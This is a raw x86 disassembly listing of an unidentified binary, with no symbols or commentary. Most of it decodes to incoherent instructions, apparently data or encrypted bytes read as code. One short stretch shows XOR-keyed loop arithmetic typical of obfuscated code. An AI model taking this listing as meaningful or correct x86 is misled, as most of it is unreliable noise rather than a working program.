  40eeb5:	mov    cl,0xc4
  40eeb7:	(bad)  
  40eeb9:	imul   ebx,DWORD PTR [esi-0x2a],0xffffffdf
  40eebd:	sti    
  40eebe:	pusha  
  40eebf:	dec    edi
  40eec0:	or     al,0x55
  40eec2:	loope  0x40eeec
  40eec4:	outs   dx,DWORD PTR ds:[esi]
  40eec5:	ins    DWORD PTR es:[edi],dx
  40eec6:	out    dx,eax
  40eec7:	call   0x6fa5:0x9bbe2008
  40eece:	inc    edx
  40eecf:	push   0xffffffa1
  40eed1:	retf   
  40eed2:	fsubrp st(3),st
  40eed4:	mov    esi,0x6e8a3077
  40eed9:	pop    ecx
  40eeda:	ins    BYTE PTR es:[edi],dx
  40eedb:	outs   dx,BYTE PTR ds:[esi]
  40eedc:	shr    bl,1
  40eede:	dec    esp
  40eedf:	push   edi
  40eee0:	mov    esi,0xb8b54d4b
  40eee5:	ja     0x40ef2b
  40eee7:	imul   esi,DWORD PTR [esi],0xffffffc1
  40eeea:	(bad)  
  40eeeb:	out    0x79,al
  40eeed:	or     BYTE PTR [esi+0x78a86847],bh
  40eef3:	mov    BYTE PTR [ecx-0x2c0154eb],bh
  40eef9:	aad    0x2e
  40eefb:	shl    dl,0x68
  40eefe:	in     eax,0xbd
  40ef00:	and    edx,DWORD PTR [ebp+ebp*1+0x15cd1f8a]
  40ef07:	jecxz  0x40ef16
  40ef09:	scas   al,BYTE PTR es:[edi]
  40ef0a:	jp     0x40eeae
  40ef0c:	inc    esi
  40ef0d:	adc    DWORD PTR [edx],ebp
  40ef0f:	cmp    al,0x65
  40ef11:	xchg   edi,eax
  40ef12:	or     DWORD PTR [edi-0x76016692],ecx
  40ef18:	es mov esp,0xf35baaec
  40ef1e:	add    ebp,DWORD PTR [edi+0x55]
  40ef21:	sub    al,0xb3
  40ef23:	add    bh,dl
  40ef25:	loope  0x40eee2
  40ef27:	loope  0x40ef56
  40ef29:	sbb    ch,BYTE PTR [bp+si-0x3e90]
  40ef2e:	sti    
  40ef2f:	mov    ch,0x8e
  40ef31:	push   0xffffffce
  40ef33:	lods   al,BYTE PTR ds:[esi]
  40ef34:	clc    
  40ef35:	add    al,0x9f
  40ef37:	jne    0x40ef44
  40ef39:	push   ds
  40ef3a:	mov    eax,ds:0xf02c6d0a
  40ef3f:	mov    dh,0xd5
  40ef41:	sahf   
  40ef42:	ja     0x40eece
  40ef44:	dec    esi
  40ef45:	(bad)  
  40ef46:	push   eax
  40ef47:	jnp    0x40eee5
  40ef49:	mov    esp,0x7056d178
  40ef4e:	test   eax,0x2d7949d5
  40ef53:	(bad)  
  40ef54:	and    al,0x80
  40ef56:	js     0x40efb6
  40ef58:	stos   BYTE PTR es:[edi],al
  40ef59:	xor    DWORD PTR [eax-0x20b0f44f],0xfc429096
  40ef63:	fs leave 
  40ef65:	fs retf 
  40ef67:	xor    esi,edi
  40ef69:	leave  
  40ef6a:	dec    esp
  40ef6b:	lods   al,BYTE PTR ds:[esi]
  40ef6c:	or     eax,0xbd984212
  40ef71:	xor    ch,ch
  40ef73:	fnstenv [eax+0x5c]
  40ef76:	and    edx,edx
  40ef78:	leave  
  40ef79:	pop    es
  40ef7a:	add    dh,BYTE PTR [edx+0x703cd225]
  40ef80:	jnp    0x40ef24
  40ef82:	adc    esp,DWORD PTR ds:0x5f6f4f8b
  40ef88:	mov    bh,0xcb
  40ef8a:	test   al,0x70
  40ef8c:	iret   
  40ef8d:	out    0xa8,eax
  40ef8f:	inc    edx
  40ef90:	push   edi
  40ef91:	loopne 0x40ef57
  40ef93:	inc    ecx
  40ef94:	sbb    bl,dl
  40ef96:	outs   dx,DWORD PTR ds:[esi]
  40ef97:	jecxz  0x40f006
  40ef99:	mov    edi,0x5927c3f9
  40ef9e:	dec    esp
  40ef9f:	pop    eax
  40efa0:	add    BYTE PTR [eax+0x68bee77c],dl
  40efa6:	cmp    al,0x45
  40efa8:	xchg   esp,eax
  40efa9:	jno    0x40efd0
  40efab:	mov    ebx,0xb5731ab4
  40efb0:	adc    edi,DWORD PTR [ebp+0x55b71f18]
  40efb6:	pop    ds
  40efb7:	xor    eax,0x456ae31
  40efbc:	enter  0x3940,0x5e
  40efc0:	out    dx,eax
  40efc1:	pop    esp
  40efc2:	xchg   ebx,eax
  40efc3:	push   esp
  40efc4:	mov    BYTE PTR [eax-0x4748f83a],bl
  40efca:	add    eax,0xa8ca0874
  40efcf:	mov    DWORD PTR [ebp+ebp*8+0x9],ebx
  40efd3:	sub    al,0xe3
  40efd5:	adc    BYTE PTR [esi+ebx*2],ah
  40efd8:	adc    al,0xcf
  40efda:	push   eax
  40efdb:	rcl    DWORD PTR [edi],0x41
  40efde:	push   ss
  40efdf:	jl     0x40efc5
  40efe1:	leave  
  40efe2:	es sti 
  40efe4:	push   0x62355693
  40efe9:	push   ecx
  40efea:	retf   0xc334
  40efed:	test   al,0x23
  40efef:	mov    ah,BYTE PTR [ebx-0x4ebacc2c]
  40eff5:	loope  0x40f049
  40eff7:	call   0x15de:0xa8de600b
  40effe:	outs   dx,BYTE PTR ds:[esi]
  40efff:	jmp    0x2212:0xed94b20f
  40f006:	scas   eax,DWORD PTR es:[edi]
  40f007:	iret   
  40f008:	lods   al,BYTE PTR ds:[esi]
  40f009:	fist   WORD PTR [eax]
  40f00b:	adc    eax,0x409e6d9d
  40f010:	retf   
  40f011:	push   cs
  40f012:	xchg   esi,eax
  40f013:	xchg   edx,eax
  40f014:	inc    esi
  40f015:	clc    
  40f016:	pop    ds
  40f017:	loopne 0x40f01a
  40f019:	or     DWORD PTR [eax],ebp
  40f01b:	push   es
  40f01c:	das    
  40f01d:	pop    eax
  40f01e:	xlat   BYTE PTR ds:[ebx]
  40f01f:	ficom  WORD PTR [ecx-0x2fcc668e]
  40f025:	cli    
  40f026:	fisub  DWORD PTR cs:[ebp+0x70f451e0]
  40f02d:	dec    edi
  40f02e:	jns    0x40efbc
  40f030:	xor    esi,ebx
  40f032:	jg     0x40f000
  40f034:	cmp    ebx,DWORD PTR [ecx+0x2daab401]
  40f03a:	xor    BYTE PTR [ecx-0x79],cl
  40f03d:	mov    edx,0x445e01b8
  40f042:	add    edi,DWORD PTR [edi]
  40f044:	das    
  40f045:	xor    BYTE PTR [esi+0x3fca8c74],dh
  40f04b:	bswap  ecx
  40f04d:	leave  
  40f04e:	outs   dx,DWORD PTR ds:[esi]
  40f04f:	imul   edx,ebp,0xffffffb0
  40f052:	mov    al,0x2c
  40f054:	sbb    eax,0xad2c6c39
  40f059:	inc    ecx
  40f05a:	out    dx,eax
  40f05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f05c:	pusha  
  40f05d:	fild   DWORD PTR [edx+edi*8]
  40f060:	int3   
  40f061:	idiv   BYTE PTR [ebx]
  40f063:	jns    0x40f0b4
  40f065:	dec    ebx
  40f066:	mov    ch,0xe3
  40f068:	or     BYTE PTR [ecx+0x2d9ed7d2],cl
  40f06e:	daa    
  40f06f:	or     al,0x1c
  40f071:	or     al,0x7e
  40f073:	pop    edi
  40f074:	stos   BYTE PTR es:[edi],al
  40f075:	mov    ds:0x504a34a1,al
  40f07a:	xlat   BYTE PTR ds:[ebx]
  40f07b:	and    al,0x8c
  40f07d:	push   es
  40f07e:	cli    
  40f07f:	sti    
  40f080:	jne    0x40f09f
  40f082:	add    ebx,DWORD PTR [ecx]
  40f084:	and    eax,DWORD PTR [edx]
  40f086:	xor    eax,0x96400c4f
  40f08b:	jg     0x40f0df
  40f08d:	stc    
  40f08e:	scas   al,BYTE PTR es:[edi]
  40f08f:	or     al,0xa7
  40f091:	jb     0x40f049
  40f093:	mov    dh,0x2
  40f095:	frstor [edi+0x16]
  40f098:	xchg   cl,dl
  40f09a:	pop    edx
  40f09b:	aam    0x1a
  40f09d:	or     eax,0x836cad88
  40f0a2:	xchg   esp,eax
  40f0a3:	sbb    ch,ch
  40f0a5:	ins    BYTE PTR es:[edi],dx
  40f0a6:	mov    edx,0xa7a38465
  40f0ab:	enter  0x3cc5,0x7c
  40f0af:	test   eax,0x9cbc971b
  40f0b4:	popf   
  40f0b5:	and    al,0x51
  40f0b7:	or     al,0xe3
  40f0b9:	inc    edi
  40f0ba:	in     eax,0x83
  40f0bc:	pop    edx
  40f0bd:	mov    bl,0xb2
  40f0bf:	jmp    0x40f0e4
  40f0c1:	rcr    esp,cl
  40f0c3:	and    eax,0x4b3f9d14
  40f0c8:	shr    ebp,cl
  40f0ca:	or     ecx,DWORD PTR [edx+0x20]
  40f0cd:	push   ss
  40f0ce:	mov    al,ds:0x9bf30049
  40f0d3:	call   0xd08cc8ca
  40f0d8:	inc    ecx
  40f0d9:	js     0x40f11e
  40f0db:	jbe    0x40f158
  40f0dd:	mov    WORD PTR [edi-0x14],fs
  40f0e0:	shl    BYTE PTR [eax],cl
  40f0e2:	add    dl,BYTE PTR [eax+0x2cdef193]
  40f0e8:	mov    esp,0xbaf5cc79
  40f0ed:	push   edx
  40f0ee:	ss repnz test dl,bl
  40f0f2:	sbb    eax,0xe42f804c
  40f0f7:	cmp    BYTE PTR [ecx+esi*2],dh
  40f0fa:	jne    0x40f14f
  40f0fc:	fs inc esi
  40f0fe:	ins    DWORD PTR es:[edi],dx
  40f0ff:	mov    dh,0x23
  40f101:	ret    0x8b9c
  40f104:	cmp    BYTE PTR [eax],ah
  40f106:	sbb    eax,0xcd477f2d
  40f10b:	jne    0x40f0af
  40f10d:	cmp    ecx,DWORD PTR [edx+eax*2+0x6eb32445]
  40f114:	or     al,0x84
  40f116:	rcr    DWORD PTR [edi-0x4],cl
  40f119:	hlt    
  40f11a:	sbb    al,cl
  40f11c:	xor    BYTE PTR [eax-0x1b],al
  40f11f:	ret    
  40f120:	mov    eax,ds:0xa44f8fe6
  40f125:	adc    eax,0x5f66bb9e
  40f12a:	xor    BYTE PTR [esi],dl
  40f12c:	mov    dh,0xd4
  40f12e:	mov    DWORD PTR [ebp+0x1f],eax
  40f131:	mov    edi,0x3791d2d0
  40f136:	dec    edx
  40f137:	cli    
  40f138:	rcl    dh,0x3
  40f13b:	imul   eax,DWORD PTR [esp+ebx*8],0xdb450358
  40f142:	sub    DWORD PTR [ebx],ebp
  40f144:	adc    cl,al
  40f146:	frndint 
  40f148:	push   ebx
  40f149:	jl     0x40f18d
  40f14b:	ins    BYTE PTR es:[edi],dx
  40f14c:	aas    
  40f14d:	push   esi
  40f14e:	or     esp,DWORD PTR [ebp-0x68132998]
  40f154:	pop    ecx
  40f155:	loope  0x40f121
  40f157:	ins    BYTE PTR es:[edi],dx
  40f158:	xor    DWORD PTR ds:0xacba192b,eax
  40f15e:	cld    
  40f15f:	call   0xa736556
  40f164:	scas   al,BYTE PTR es:[edi]
  40f165:	or     BYTE PTR [esi-0x10df515b],cl
  40f16b:	pop    esp
  40f16c:	cwde   
  40f16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f16e:	fisub  WORD PTR [ecx+0x668c094e]
  40f174:	ja     0x40f1bf
  40f176:	and    al,0xeb
  40f178:	and    al,0x85
  40f17a:	inc    ecx
  40f17b:	mov    ch,BYTE PTR [edx+eiz*4]
  40f17e:	stc    
  40f17f:	adc    eax,0x69f4b562
  40f184:	mov    eax,0x31a517ae
  40f189:	stos   DWORD PTR es:[edi],eax
  40f18a:	adc    eax,0xf102429c
  40f18f:	out    dx,eax
  40f190:	and    BYTE PTR [ebp-0x62790063],0x46
  40f197:	lahf   
  40f198:	imul   ebx,DWORD PTR [ebp+ebx*4+0x7c],0xc34115de
  40f1a0:	and    BYTE PTR [eax],dh
  40f1a2:	hlt    
  40f1a3:	arpl   WORD PTR [eax+0x681ebeb4],di
  40f1a9:	or     ah,bh
  40f1ab:	pop    ecx
  40f1ac:	mov    bl,0xda
  40f1ae:	in     eax,0x10
  40f1b0:	mov    ds:0xbbd24dec,eax
  40f1b5:	ret    
  40f1b6:	mov    bl,0xac
  40f1b8:	xor    edi,esi
  40f1ba:	mov    ebp,0x3466d134
  40f1bf:	xchg   esp,eax
  40f1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c1:	(bad)  
  40f1c2:	or     edx,ebp
  40f1c4:	xchg   edi,eax
  40f1c5:	inc    ecx
  40f1c6:	xor    cl,cl
  40f1c8:	stos   BYTE PTR es:[edi],al
  40f1c9:	and    ebp,DWORD PTR gs:[ebx]
  40f1cc:	lea    ecx,[ebx]
  40f1ce:	rcl    BYTE PTR [ebp+edi*1-0x6aeebe58],1
  40f1d5:	or     eax,0xe5a281b2
  40f1da:	cld    
  40f1db:	mov    bh,0x47
  40f1dd:	fild   DWORD PTR [ecx-0x71]
  40f1e0:	mov    gs,WORD PTR [edx]
  40f1e2:	test   BYTE PTR [edx],bh
  40f1e4:	shl    dl,1
  40f1e6:	fwait
  40f1e7:	inc    ebp
  40f1e8:	jae    0x40f191
  40f1ea:	lock cwde 
  40f1ec:	jecxz  0x40f267
  40f1ee:	jg     0x40f17f
  40f1f0:	lods   al,BYTE PTR ds:[esi]
  40f1f1:	jp     0x40f1d8
  40f1f3:	mov    esi,0x3064df4b
  40f1f8:	add    DWORD PTR [eax],ebp
  40f1fa:	leave  
  40f1fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1fc:	adc    eax,0x1538945d
  40f201:	pop    esp
  40f202:	pop    ds
  40f203:	sub    eax,0x2be48d2f
  40f208:	push   esp
  40f209:	inc    edi
  40f20a:	add    al,0xb7
  40f20c:	mov    WORD PTR [ecx-0x43],es
  40f20f:	(bad)  
  40f212:	or     BYTE PTR [ecx-0x29],ch
  40f215:	jns    0x40f20f
  40f217:	gs xchg esp,eax
  40f219:	sbb    bh,BYTE PTR [ebx]
  40f21b:	xchg   BYTE PTR [ebx+edx*1-0x6bdbb0e6],bl
  40f222:	jae    0x40f1d7
  40f224:	and    DWORD PTR [ecx],0xade8ff58
  40f22a:	pushf  
  40f22b:	push   edx
  40f22c:	mov    BYTE PTR [edi+0x28],dh
  40f22f:	inc    edi
  40f230:	cmc    
  40f231:	lods   eax,DWORD PTR ds:[esi]
  40f232:	out    0x74,eax
  40f234:	jne    0x40f247
  40f236:	leave  
  40f237:	jb     0x40f249
  40f239:	xor    al,0xd0
  40f23b:	mov    dl,0xe3
  40f23d:	test   al,0x57
  40f23f:	div    BYTE PTR [ecx]
  40f241:	retf   
  40f242:	loope  0x40f1d5
  40f244:	jmp    0xa9f4:0x6a26ac24
  40f24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f24c:	fdivp  st(1),st
  40f24e:	js     0x40f24d
  40f250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f251:	mov    WORD PTR [eax+ecx*8-0x5e679e7f],?
  40f258:	(bad)  
  40f259:	daa    
  40f25a:	leave  
  40f25b:	push   ecx
  40f25c:	jl     0x40f206
  40f25e:	fwait
  40f25f:	daa    
  40f260:	jp     0x40f23e
  40f262:	push   0xffffffe2
  40f264:	mov    ah,0xf2
  40f266:	into   
  40f267:	nop
  40f268:	ja     0x40f28e
  40f26a:	nop
  40f26b:	sub    ch,al
  40f26d:	inc    ebp
  40f26e:	daa    
  40f26f:	push   ecx
  40f270:	mov    dh,0x3e
  40f272:	std    
  40f273:	mov    bh,0x28
  40f275:	mov    ebx,0xae5c5e04
  40f27a:	add    al,0xba
  40f27c:	and    ah,BYTE PTR [eax]
  40f27e:	and    al,0xef
  40f280:	sbb    edx,DWORD PTR [ebx+0x5aabf799]
  40f286:	pop    ecx
  40f287:	in     al,0x4
  40f289:	mov    ecx,0x4e2840ef
  40f28e:	ja     0x40f2f1
  40f290:	loopne 0x40f265
  40f292:	out    dx,eax
  40f293:	cmp    al,0xa3
  40f295:	sar    DWORD PTR [eax-0x7f9864b1],cl
  40f29b:	xchg   esp,eax
  40f29c:	sahf   
  40f29d:	xchg   ebx,eax
  40f29e:	xchg   ebx,eax
  40f29f:	jns    0x40f283
  40f2a1:	or     ebp,esp
  40f2a3:	or     DWORD PTR fs:[ebx-0x13],ecx
  40f2a7:	xor    BYTE PTR [edx],al
  40f2a9:	pop    es
  40f2aa:	sub    BYTE PTR [ecx-0x46aa3d1c],0x1e
  40f2b1:	gs jae 0x40f263
  40f2b4:	jb     0x40f257
  40f2b6:	jl     0x40f2d1
  40f2b8:	push   ebp
  40f2b9:	sti    
  40f2ba:	pop    gs
  40f2bc:	sub    dl,BYTE PTR [ebp-0x6]
  40f2bf:	push   ds
  40f2c0:	jmp    0x3b728cde
  40f2c5:	pusha  
  40f2c6:	and    esp,ecx
  40f2c8:	push   0xffffffc7
  40f2ca:	mov    WORD PTR [ebx],es
  40f2cc:	lea    ebx,[ebx-0x65]
  40f2cf:	inc    ecx
  40f2d0:	sbb    esp,DWORD PTR [edx]
  40f2d2:	adc    DWORD PTR [edi+0x7b],eax
  40f2d5:	in     eax,0x5e
  40f2d7:	sub    eax,0x89dd319c
  40f2dc:	jb     0x40f30d
  40f2de:	inc    edi
  40f2df:	xor    DWORD PTR [ebx-0x3985f88b],ebx
  40f2e5:	xor    esp,DWORD PTR [edi+0x2d]
  40f2e8:	cs ret 0xbeee
  40f2ec:	sub    eax,0xecb0b8d2
  40f2f1:	imul   edi,DWORD PTR gs:[esi+0x43],0xdf4fa575
  40f2f9:	inc    ecx
  40f2fa:	enter  0xf0db,0xc9
  40f2fe:	(bad)  
  40f2ff:	lods   eax,DWORD PTR ds:[esi]
  40f300:	mov    eax,ds:0x9e0c0a8
  40f305:	mov    esp,edx
  40f307:	aad    0xab
  40f309:	aas    
  40f30a:	xor    BYTE PTR [ecx+0x6ae98743],ah
  40f310:	rol    DWORD PTR [ecx+0x7b],cl
  40f313:	inc    eax
  40f314:	arpl   bp,dx
  40f316:	jns    0x40f304
  40f318:	push   ss
  40f319:	scas   eax,DWORD PTR es:[edi]
  40f31a:	je     0x40f2e4
  40f31c:	clc    
  40f31d:	shl    BYTE PTR [edx+0x7b],cl
  40f320:	fnstenv [edi+esi*2+0x7a]
  40f324:	es or  esi,ebp
  40f327:	inc    ebp
  40f328:	dec    ebx
  40f329:	mov    BYTE PTR [eax],al
  40f32b:	in     al,0xf7
  40f32d:	int    0x9f
  40f32f:	cmp    BYTE PTR [ebx],bh
  40f331:	icebp  
  40f332:	clc    
  40f333:	dec    ebp
  40f334:	arpl   WORD PTR [eax+0x1fae7711],bp
  40f33a:	in     al,0x35
  40f33c:	jbe    0x40f348
  40f33e:	in     eax,dx
  40f33f:	ret    
  40f340:	pushf  
  40f341:	mov    ebx,0x8cdcf016
  40f346:	(bad)  
  40f347:	adc    al,0xe8
  40f349:	fistp  QWORD PTR [esi+0x6b]
  40f34c:	test   eax,0xc55ef145
  40f351:	daa    
  40f352:	dec    ebp
  40f353:	jge    0x40f3c3
  40f355:	out    0xa5,eax
  40f357:	test   BYTE PTR [ebx+0xeff85d4],0x1c
  40f35e:	sbb    BYTE PTR ds:[ebp-0x6f],ch
  40f362:	test   eax,0x751a24ce
  40f367:	cs (bad) 
  40f369:	and    al,0x99
  40f36b:	and    DWORD PTR [eax],esp
  40f36d:	add    al,0xc0
  40f36f:	ret    0xcbfc
  40f372:	mov    eax,eax
  40f374:	sub    al,ah
  40f376:	out    dx,eax
  40f377:	mov    ds:0x4ae5fda7,al
  40f37c:	and    DWORD PTR [esi+0x1a8befe7],ebx
  40f382:	xor    edi,ebx
  40f384:	mov    DWORD PTR [edx],edi
  40f386:	mov    edx,DWORD PTR [ebp+0x8]
  40f389:	xor    edx,eax
  40f38b:	inc    ecx
  40f38c:	inc    DWORD PTR [ebp-0x18]
  40f38f:	add    edx,esi
  40f391:	cmp    ecx,edx
  40f393:	jb     0x40cfd4
  40f399:	jmp    0x40f3e3
  40f39e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3a1:	mov    DWORD PTR [ebp+0x8],ecx
  40f3a4:	jmp    0x40f3d6
  40f3a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ac:	mov    edx,DWORD PTR [ebp-0x8]
  40f3af:	xor    ecx,eax
  40f3b1:	xor    edx,eax
  40f3b3:	sub    ecx,edx
  40f3b5:	sub    ecx,esi
  40f3b7:	xor    ecx,eax
  40f3b9:	mov    DWORD PTR [ebp+0x8],ecx
  40f3bc:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3bf:	mov    edx,DWORD PTR [ebp+0x8]
  40f3c2:	imul   edx,edx,0x5708f1
  40f3c8:	xor    ecx,eax
  40f3ca:	add    ecx,esi
  40f3cc:	lea    ecx,[ebp+ecx*4-0x64]
  40f3d0:	mov    edi,DWORD PTR [ecx]
  40f3d2:	add    edx,edi
  40f3d4:	mov    DWORD PTR [ecx],edx
  40f3d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3d9:	xor    ecx,eax
  40f3db:	add    ecx,esi
  40f3dd:	jne    0x40f3a9
  40f3e3:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3e6:	mov    DWORD PTR [ebp+0x8],ecx
  40f3e9:	jmp    0x40f41b
  40f3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3f1:	mov    edx,DWORD PTR [ebp-0x8]
  40f3f4:	xor    ecx,eax
  40f3f6:	xor    edx,eax
  40f3f8:	sub    ecx,edx
  40f3fa:	sub    ecx,esi
  40f3fc:	xor    ecx,eax
  40f3fe:	mov    DWORD PTR [ebp+0x8],ecx
  40f401:	mov    ecx,DWORD PTR [ebp+0x8]
  40f404:	mov    edx,DWORD PTR [ebp+0x8]
  40f407:	imul   edx,edx,0x5708f1
  40f40d:	xor    ecx,eax
  40f40f:	add    ecx,esi
  40f411:	lea    ecx,[ebp+ecx*4-0x64]
  40f415:	mov    edi,DWORD PTR [ecx]
  40f417:	add    edx,edi
  40f419:	mov    DWORD PTR [ecx],edx
  40f41b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f41e:	xor    ecx,eax
  40f420:	add    ecx,esi
  40f422:	jne    0x40f3ee
  40f428:	mov    ecx,DWORD PTR [ebp-0x8]
  40f42b:	mov    edx,DWORD PTR [ebp-0x20]
  40f42e:	xor    ecx,eax
  40f430:	lea    ecx,[ecx+edx*1+0x3272dc]
  40f437:	mov    DWORD PTR [ebp-0x20],ecx
  40f43a:	inc    DWORD PTR [ebp+0xc]
  40f43d:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f440:	xor    ecx,eax
  40f442:	add    ecx,esi
  40f444:	jne    0x40ced6
  40f44a:	jmp    0x413be3
  40f44f:	mov    ecx,DWORD PTR [ebp-0xc]
  40f452:	mov    DWORD PTR [ebp+0x8],ecx
  40f455:	jmp    0x41180f
  40f45a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f45d:	mov    edx,DWORD PTR [ebp-0x8]
  40f460:	xor    ecx,eax
  40f462:	xor    edx,eax
  40f464:	sub    ecx,edx
  40f466:	jmp    0x4117ee
  40f46b:	mov    al,ds:0x7334f23d
  40f470:	cmp    ebp,DWORD PTR [edx+0x3e2d7a79]
  40f476:	mov    ds:0x94518a58,al
  40f47b:	pop    ebp
  40f47c:	int    0x7c
  40f47e:	jl     0x40f487
  40f480:	pop    edi
  40f481:	jl     0x40f4ff
  40f483:	fs and bl,dh
  40f486:	jg     0x40f498
  40f488:	xlat   BYTE PTR ds:[ebx]
  40f489:	mov    ah,bh
  40f48b:	call   0x44803547
  40f490:	pop    ebx
  40f491:	push   ecx
  40f492:	jne    0x40f4d4
  40f494:	add    al,0xb5
  40f496:	jmp    0x40f45f
  40f498:	inc    edx
  40f499:	push   esi
  40f49a:	dec    eax
  40f49b:	outs   dx,BYTE PTR ds:[esi]
  40f49c:	call   0x49c5c59b
  40f4a1:	sti    
  40f4a2:	lock sar BYTE PTR [esp+edi*8-0x24a90f3e],1
  40f4aa:	fisubr DWORD PTR [ebx+0x8]
  40f4ad:	sub    eax,0xdd49a3c5
  40f4b2:	lea    ebp,[esi]
  40f4b4:	aaa    
  40f4b5:	stc    
  40f4b6:	dec    edi
  40f4b7:	add    ebx,DWORD PTR [eax-0x29]
  40f4ba:	fs dec edx
  40f4bc:	mov    esp,0xbe7bc15
  40f4c1:	pop    ds
  40f4c2:	mov    bl,0xe9
  40f4c4:	aaa    
  40f4c5:	sub    eax,DWORD PTR [edx]
  40f4c7:	inc    edx
  40f4c8:	mov    cs,WORD PTR [ecx]
  40f4ca:	pop    eax
  40f4cb:	cli    
  40f4cc:	sub    BYTE PTR [edi],al
  40f4ce:	inc    edx
  40f4cf:	push   ecx
  40f4d0:	leave  
  40f4d1:	dec    edx
  40f4d2:	retf   0x8193
  40f4d5:	or     DWORD PTR [esi+0x369a7b54],esi
  40f4db:	jecxz  0x40f4f0
  40f4dd:	(bad)  
  40f4de:	mov    dh,0x9
  40f4e0:	add    cl,bh
  40f4e2:	(bad)  
  40f4e3:	dec    ebp
  40f4e4:	gs jp  0x40f486
  40f4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e8:	cmp    eax,0x98559a8d
  40f4ed:	mov    ds:0x40dc44d0,al
  40f4f2:	xor    eax,0xb567bb59
  40f4f7:	aaa    
  40f4f8:	mov    ss,ebp
  40f4fa:	jg     0x40f513
  40f4fc:	ss xor al,0x51
  40f4ff:	js     0x40f4d6
  40f501:	and    al,0x51
  40f503:	mov    ds:0x6b861b60,eax
  40f508:	test   BYTE PTR [edx+0x2b13fa4],al
  40f50e:	cdq    
  40f50f:	test   DWORD PTR [edx-0x5d],edi
  40f512:	arpl   WORD PTR [edi-0x50],ax
  40f515:	cwde   
  40f516:	fist   DWORD PTR [edx]
  40f518:	in     al,dx
  40f519:	aad    0xb5
  40f51b:	repz in al,dx
  40f51d:	adc    eax,0xe9fbcb75
  40f522:	xchg   edx,eax
  40f523:	jns    0x40f4b8
  40f525:	test   ch,0xd3
  40f528:	jns    0x40f5a3
  40f52a:	and    ch,al
  40f52c:	dec    eax
  40f52d:	outs   dx,BYTE PTR ds:[esi]
  40f52e:	(bad)  
  40f52f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f530:	jmp    0x5dd:0xaa4186b4
  40f537:	fdivr  QWORD PTR [esi+eax*8]
  40f53a:	add    DWORD PTR [ebp-0x15],eax
  40f53d:	ss xor eax,0x77b53aee
  40f543:	and    dh,BYTE PTR [edi-0x42]
  40f546:	lea    eax,[ebx]
  40f548:	mov    bl,0xb8
  40f54a:	addr16 fs retf 0x4c2e
  40f54f:	push   0x8b92f450
  40f554:	dec    ebx
  40f555:	in     eax,dx
  40f556:	sbb    al,0xcb
  40f558:	push   ds
  40f559:	fs xchg ecx,eax
  40f55b:	std    
  40f55c:	cmp    edi,DWORD PTR [esi+0x4e76eb33]
  40f562:	push   0x8094a4a
  40f567:	adc    eax,0x126e8b7b
  40f56c:	xchg   DWORD PTR [ebp-0x6a],ebx
  40f56f:	pop    edx
  40f570:	outs   dx,DWORD PTR ds:[esi]
  40f571:	cmp    BYTE PTR [ebx-0x79],dl
  40f574:	in     eax,0xf3
  40f576:	sub    BYTE PTR [edx],dl
  40f578:	or     dh,BYTE PTR [ebp+0x77]
  40f57b:	lds    edx,FWORD PTR [edx-0x5c774ce9]
  40f581:	loop   0x40f5a4
  40f583:	push   cs
  40f584:	adc    ebx,DWORD PTR [edi-0x20]
  40f587:	fs pusha 
  40f589:	mov    ch,0x81
  40f58b:	aas    
  40f58c:	cs jmp 0x328e:0xec2eb8e2
  40f594:	pushf  
  40f595:	mov    BYTE PTR [ebp+0x26],bh
  40f598:	mov    ch,0x52
  40f59a:	mov    dl,0x3b
  40f59c:	mov    ebp,DWORD PTR [edi-0x26]
  40f59f:	shl    eax,0x79
  40f5a2:	int3   
  40f5a3:	test   DWORD PTR [edx+eiz*2+0x0],ecx
  40f5a7:	or     al,0x2f
  40f5a9:	dec    edi
  40f5aa:	and    cl,BYTE PTR [ebx]
  40f5ac:	adc    edx,esi
  40f5ae:	fcmovnbe st,st(1)
  40f5b0:	sar    BYTE PTR [ebp-0x1c54dc2d],1
  40f5b6:	loop   0x40f53e
  40f5b8:	retf   
  40f5b9:	(bad)  
  40f5ba:	jl     0x40f5c0
  40f5bc:	mov    cl,0x11
  40f5be:	sub    al,0x75
  40f5c0:	mov    eax,0xc64989a1
  40f5c5:	retf   
  40f5c6:	scas   al,BYTE PTR es:[edi]
  40f5c7:	lahf   
  40f5c8:	pop    edi
  40f5c9:	push   0xdc03b978
  40f5ce:	shr    DWORD PTR [eax+0x355a160b],cl
  40f5d4:	sar    edx,0x2e
  40f5d7:	fdivr  st,st(1)
  40f5d9:	xchg   ebx,eax
  40f5da:	rcr    dl,1
  40f5dc:	cmp    al,0x4
  40f5de:	out    0x72,al
  40f5e0:	sar    DWORD PTR [edi],1
  40f5e2:	xchg   DWORD PTR [ebx-0x42aebb19],esi
  40f5e8:	or     BYTE PTR [ebx-0x4e],ah
  40f5eb:	push   0x48bed140
  40f5f0:	or     bl,BYTE PTR [edi+0x253ba1b7]
  40f5f6:	inc    edi
  40f5f7:	out    0x74,eax
  40f5f9:	sub    BYTE PTR [ecx],al
  40f5fb:	repnz xchg esi,eax
  40f5fd:	ret    0xb0bb
  40f600:	lock jb 0x40f5bf
  40f603:	sub    ebp,ebx
  40f605:	sub    eax,0x2871dd1d
  40f60a:	xchg   ecx,eax
  40f60b:	adc    bh,bl
  40f60d:	repz out dx,al
  40f60f:	lods   al,BYTE PTR ds:[esi]
  40f610:	call   eax
  40f612:	mov    bh,0xc5
  40f614:	push   ebp
  40f615:	mov    eax,0x2d78b8c5
  40f61a:	stos   DWORD PTR es:[edi],eax
  40f61b:	cdq    
  40f61c:	xchg   BYTE PTR [esi-0x13],ch
  40f61f:	dec    edx
  40f620:	push   cs
